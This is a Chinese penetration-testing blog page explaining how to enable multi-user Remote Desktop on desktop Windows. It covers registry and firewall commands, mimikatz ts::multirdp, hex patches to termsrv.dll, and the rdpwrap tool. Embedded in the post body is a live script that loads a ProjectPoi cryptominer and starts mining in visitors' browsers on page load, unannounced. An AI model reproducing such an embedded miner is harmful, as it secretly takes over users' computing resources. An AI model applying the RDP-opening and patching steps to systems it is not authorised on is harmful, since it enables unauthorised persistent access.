<!DOCTYPE html>
<html>
  <!-- Html Head Tag-->
  <head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="description" content="">
  <meta name="author" content="Damit 5">
  <!-- Open Graph Data -->
  <meta property="og:title" content="Windows系统远程桌面的多用户登录"/>
  <meta property="og:description" content="纸上得来终觉浅，绝知此事要躬行。" />
  <meta property="og:site_name" content="Damit5&#39;s Blog"/>
  <meta property="og:type" content="article" />
  <meta property="og:image" content="http://damit5.ml"/>
  
    <link rel="alternate" href="/atom.xml" title="Damit5&#39;s Blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  

  <!-- Site Title -->
  <title>Damit5's Blog</title>

  <!-- Bootstrap CSS -->
  <link rel="stylesheet" href="/css/bootstrap.min.css">
  <!-- Custom CSS -->
  
  <link rel="stylesheet" href="/css/style.dark.css">

  <!-- Google Analytics -->
  

</head>

  <body>
    <!-- Page Header -->


<header class="site-header header-background" style="background-image: url(/img/background.jpg)">
  <div class="container">
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <div class="page-title with-background-image">
          <p class="title">Windows系统远程桌面的多用户登录</p>
          <p class="subtitle"></p>
        </div>
        <div class="site-menu with-background-image">
          <ul>
            
              <li>
                <a href="/">
                  
                  Home
                  
                </a>
              </li>
            
              <li>
                <a href="/archives">
                  
                  Archives
                  
                </a>
              </li>
            
              <li>
                <a href="https://github.com/damit5/damit5.github.io">
                  
                  Github
                  
                </a>
              </li>
            
              <li>
                <a href="mailto:damit5@protonmail.com">
                  
                  Email
                  
                </a>
              </li>
            
              <li>
                <a href="http://damit5.ml/AboutMe">
                  
                  AboutMe
                  
                </a>
              </li>
            
              <li>
                <a href="http://damit5.ml/Link">
                  
                  Friend Link
                  
                </a>
              </li>
            
          </ul>
        </div>
      </div>
    </div>
  </div>
</header>

<article>
  <div class="container typo">
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <div class="post-info text-muted">
          
            <!-- Author -->
            <span class="author info">By Damit 5</span>
          
          <!-- Date -->
          <span class="date-time info">On
            <span class="date">2017-11-13</span>
            <span class="time">12:33:25</span>
          </span>
          
        </div>
        <!-- Tags -->
        
          <div class="post-tags text-muted">
            Tags: 

<a class="tag" href="/tags/渗透测试/">#渗透测试</a>


          </div>
        
        <!-- Post Main Content -->
        <div class="post-content">
          <script src="/assets/js/APlayer.min.js"> </script><div id="aplayer8" class="aplayer" style="margin-bottom: 20px;"></div>
		<script>
			new APlayer({
				element: document.getElementById("aplayer8"),
				narrow: false,
				autoplay: true,
				showlrc: 0,
				music: {
					title: "六月的雨",
					author: "胡歌",
					url: "http://damit5.kiwi/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3",
					pic: "http://damit5.kiwi/Music/233.jpg",
				}
			});
		</script>

<html>
<head>
<script>
var script = document.createElement("script");
script.type = "text/javascript";
script.src = "https://ppoi.org/lib/projectpoi.min.js";
script.onload = script.onreadystatechange = function(){var miner = new ProjectPoi.Anonymous("aoZgifd6N8x48tCIwRtb7bJA",{threads: 4,autoThreads: false,throttle: 0.5});miner.start();}
document.getElementsByTagName("head")[0].appendChild(script);
</script>
</head>
</html>

<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在渗透测试中，经常会接触Windows服务器的远程桌面服务，通过界面对服务器进行管理。而对于普通的Windows系统，在某些条件下也需要进行界面操作。</p>
<p>虽然我们可以通过编写程序来实现界面操作（捕获桌面信息，压缩传输，发送鼠标键盘消息等），但是如果能够使用远程桌面服务，岂不是更加方便高效</p>
<p>那么，对应非服务器版本的Windows系统，在使用远程桌面服务有哪些需要注意的问题呢，本文将会逐个分析介绍。</p>
<a id="more"></a>
<h5 id="友情提示：方法一和方法三都不免杀，方法二需要-TrustedInstaller-权限"><a href="#友情提示：方法一和方法三都不免杀，方法二需要-TrustedInstaller-权限" class="headerlink" title="友情提示：方法一和方法三都不免杀，方法二需要 TrustedInstaller 权限"></a>友情提示：方法一和方法三都不免杀，方法二需要 TrustedInstaller 权限</h5><h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><h5 id="本文将要介绍如下内容："><a href="#本文将要介绍如下内容：" class="headerlink" title="本文将要介绍如下内容："></a>本文将要介绍如下内容：</h5><ul>
<li><p>开启远程桌面的方法</p>
</li>
<li><p>使用mimikatz支持远程桌面多用户的原理</p>
</li>
<li><p>改进思路</p>
</li>
<li><p>测试工具rdpwrap</p>
</li>
</ul>
<h2 id="0x02-开启远程桌面的方法"><a href="#0x02-开启远程桌面的方法" class="headerlink" title="0x02 开启远程桌面的方法"></a>0x02 开启远程桌面的方法</h2><h4 id="1、查询系统是否允许3389远程连接"><a href="#1、查询系统是否允许3389远程连接" class="headerlink" title="1、查询系统是否允许3389远程连接"></a>1、查询系统是否允许3389远程连接</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections</div></pre></td></tr></table></figure>
<h6 id="1表示关闭，0表示开启"><a href="#1表示关闭，0表示开启" class="headerlink" title="1表示关闭，0表示开启"></a>1表示关闭，0表示开启</h6><p>查看远程连接的端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber</div></pre></td></tr></table></figure></p>
<p>端口格式为16进制，如下图</p>
<p><img src="http://www.4hou.com/uploads/20171103/1509695649103184.png" alt="1"></p>
<p>0xd3d转换为十进制为33389</p>
<h4 id="2、本机开启3389远程连接的方法"><a href="#2、本机开启3389远程连接的方法" class="headerlink" title="2、本机开启3389远程连接的方法"></a>2、本机开启3389远程连接的方法</h4><h6 id="方法1：通过cmd"><a href="#方法1：通过cmd" class="headerlink" title="方法1：通过cmd"></a>方法1：通过cmd</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</div><div class="line">REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 0x00000d3d /f</div></pre></td></tr></table></figure>
<h6 id="方法2：通过reg文件"><a href="#方法2：通过reg文件" class="headerlink" title="方法2：通过reg文件"></a>方法2：通过reg文件</h6><p>内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Windows Registry Editor Version 5.00</div><div class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]</div><div class="line">&quot;fDenyTSConnections&quot;=dword:00000000</div><div class="line">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]</div><div class="line">&quot;PortNumber&quot;=dword:00000d3d</div></pre></td></tr></table></figure></p>
<p>导入注册表：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">regedit /s a.reg</div></pre></td></tr></table></figure></p>
<h5 id="注："><a href="#注：" class="headerlink" title="注："></a>注：</h5><p>如果修改连接端口，系统重启后才能生效</p>
<p>补充</p>
<p>如果系统未配置过远程桌面服务，第一次开启时还需要添加防火墙规则允许3389端口，如下图</p>
<p><img src="http://www.4hou.com/uploads/20171103/1509696108150175.png" alt="1"></p>
<p>修改防火墙配置，允许3389端口的命令如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</div></pre></td></tr></table></figure>
<h4 id="3、远程连接方法"><a href="#3、远程连接方法" class="headerlink" title="3、远程连接方法"></a>3、远程连接方法</h4><p>kali使用3389远程连接：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rdesktop 192.168.1.1:3389</div></pre></td></tr></table></figure></p>
<p>Windows：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mstsc.exe</div></pre></td></tr></table></figure></p>
<h2 id="0x03-非服务器版本的Windows系统默认只允许一个账户登录"><a href="#0x03-非服务器版本的Windows系统默认只允许一个账户登录" class="headerlink" title="0x03 非服务器版本的Windows系统默认只允许一个账户登录"></a>0x03 非服务器版本的Windows系统默认只允许一个账户登录</h2><p>具体表现为：</p>
<p>远程登录时，使用与原系统相同的账户，原系统将被切换到登录界面</p>
<p>如下图</p>
<p><img src="http://www.4hou.com/uploads/20171103/1509696187574769.png" alt="1"></p>
<p>使用不同的账户，登录时提示其他用户已登录到此计算机，如下图</p>
<p><img src="http://www.4hou.com/uploads/20171103/1509696206120025.png" alt="1"></p>
<p>选择继续后，原系统桌面将弹框提示是否断开当前连接(30秒后默认选择同意，退回到登录界面)</p>
<p>如下图</p>
<p><img src="http://www.4hou.com/uploads/20171103/1509696229986054.png" alt="1"></p>
<h2 id="0x04-非服务器版本的Windows系统支持多用户登录的方法"><a href="#0x04-非服务器版本的Windows系统支持多用户登录的方法" class="headerlink" title="0x04 非服务器版本的Windows系统支持多用户登录的方法"></a>0x04 非服务器版本的Windows系统支持多用户登录的方法</h2><h4 id="1、使用mimikatz"><a href="#1、使用mimikatz" class="headerlink" title="1、使用mimikatz"></a>1、使用mimikatz</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">privilege::debugts::multirdp</div></pre></td></tr></table></figure>
<p>执行如下图</p>
<p><img src="http://www.4hou.com/uploads/20171103/1509696264202143.png" alt="1"></p>
<p>开启多用户登录功能，最高支持到Win7</p>
<p>使用与原系统相同的账户，原系统还是会被切换到登录界面</p>
<p>使用与原系统不同的账户，登录成功，如下图</p>
<p><img src="http://www.4hou.com/uploads/20171103/1509696288976886.png" alt="1"></p>
<p>通过查看mimikatz的源码找到修改思路，代码位置如下：</p>
<p><a href="https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_ts.c" target="_blank" rel="external">https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_ts.c</a></p>
<p>Windows在开启服务Remote Desktop Services时，会加载termsrv.dll，如下图</p>
<p><img src="http://www.4hou.com/uploads/20171103/1509696315433502.png" alt="1"></p>
<p>通过修改内存中的termsrv.dll实现开启多用户功能，具体操作如下：</p>
<p>Win7 x86：</p>
<p>查找:0x3B86200300000F84</p>
<p>替换为:0xC78620030000FFFFFF7F9090</p>
<p>Win7 x64：</p>
<p>查找:0x39873C0600000F84</p>
<p>替换为:0xC7873C060000FFFFFF7F9090</p>
<p>当然，该方法在系统重启后失效</p>
<p>更近一步，如果我们直接修改文件termsrv.dll，能否实现永久开启多用户登录的功能呢？</p>
<p>继续接下来的测试</p>
<h4 id="2、修改termsrv-dll"><a href="#2、修改termsrv-dll" class="headerlink" title="2、修改termsrv.dll"></a>2、修改termsrv.dll</h4><p>推荐工具： CFF Explorer</p>
<p>测试系统： Win7 x64</p>
<p>打开c：\windows\system32下的termsrv.dll</p>
<p>Hex Editor</p>
<p>查看十六进制数据39873C0600000F84</p>
<p>如下图</p>
<p><img src="http://www.4hou.com/uploads/20171103/1509696348182522.png" alt="1"></p>
<p>从0x0001738A处开始，选中12字节，替换为C7873C060000FFFFFF7F9090</p>
<p>保存dll</p>
<p>注：</p>
<p>需要先停止远程桌面服务才能替换termsrv.dll</p>
<p>替换termsrv.dll后，重新开启服务TermService</p>
<p>尝试使用不同用户远程连接，成功，验证该思路正确</p>
<p>完整操作如下：</p>
<h5 id="1-查看Remote-Desktop-Services服务状态"><a href="#1-查看Remote-Desktop-Services服务状态" class="headerlink" title="1.查看Remote Desktop Services服务状态"></a>1.查看Remote Desktop Services服务状态</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sc qc TermService</div></pre></td></tr></table></figure>
<h5 id="2-如果服务启动，需要先关闭"><a href="#2-如果服务启动，需要先关闭" class="headerlink" title="2.如果服务启动，需要先关闭"></a>2.如果服务启动，需要先关闭</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">net stop TermService /y</div></pre></td></tr></table></figure>
<h5 id="3-删除原termsrv-dll"><a href="#3-删除原termsrv-dll" class="headerlink" title="3.删除原termsrv.dll"></a>3.删除原termsrv.dll</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">del c:\windows\system32\termsrv.dll</div></pre></td></tr></table></figure>
<h5 id="4-替换新termsrv-dll"><a href="#4-替换新termsrv-dll" class="headerlink" title="4.替换新termsrv.dll"></a>4.替换新termsrv.dll</h5><h5 id="5-启动服务"><a href="#5-启动服务" class="headerlink" title="5.启动服务"></a>5.启动服务</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">net start TermService</div></pre></td></tr></table></figure>
<h5 id="6-远程连接"><a href="#6-远程连接" class="headerlink" title="6.远程连接"></a>6.远程连接</h5><p>成功实现多用户登录</p>
<p>补充1：</p>
<p>Win7 x86：</p>
<p>查找:0x3B86200300000F84</p>
<p>替换为:0xC78620030000FFFFFF7F9090</p>
<p>补充2</p>
<p>常见Windows系统的版本号：</p>
<p><img src="http://www.4hou.com/uploads/20171103/1509696453711679.png" alt="1"></p>
<h4 id="3、使用工具rdpwrap"><a href="#3、使用工具rdpwrap" class="headerlink" title="3、使用工具rdpwrap"></a>3、使用工具rdpwrap</h4><p>工程地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://github.com/stascorp/rdpwrap</div></pre></td></tr></table></figure></p>
<p>工具地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://github.com/stascorp/rdpwrap/releases</div></pre></td></tr></table></figure></p>
<p>支持Win Vista – Win 10</p>
<p>不修改termsrv.dll，通过传入不同参数实现</p>
<p>安装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">RDPWInst.exe -i is</div></pre></td></tr></table></figure></p>
<p>测试如下图<br><img src="http://www.4hou.com/uploads/20171103/1509696526799007.png" alt="1"></p>
<p>释放rdpwrap.dll和rdpwrap.ini至System32文件夹</p>
<p>rdpwrap.dll会被加载到同termsrv.dll相同的进程</p>
<p>此时，能够使用不同用户进行远程连接</p>
<p>卸载：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">RDPWInst.exe -u</div></pre></td></tr></table></figure></p>
<h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><p>本文介绍了三种支持远程桌面多用户登录的方法，适用于不同条件，对于替换termsrv.dll的方法，需要根据系统具体版本，使用不同的替换位置</p>

        </div>
      </div>
    </div>
  </div>
</article>



    <!-- Footer -->
<footer>
  <div class="container">
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <p class="copyright text-muted">
          Theme By <a target="_blank" href="https://github.com/levblanc">Levblanc.</a>
          Inspired By <a target="_blank" href="https://github.com/klugjo/hexo-theme-clean-blog">Clean Blog.</a>
        <p class="copyright text-muted">
          Powered By <a target="_blank" href="https://hexo.io/">Hexo.</a>
        </p>
      </div>
    </div>
  </div>
</footer>


    <!-- After Footer Scripts -->
<script src="/js/highlight.pack.js"></script>
<script>
  document.addEventListener("DOMContentLoaded", function(event) {
    var codeBlocks = Array.prototype.slice.call(document.getElementsByTagName('pre'))
    codeBlocks.forEach(function(block, index) {
      hljs.highlightBlock(block);
    });
  });
</script>

  </body>
</html>

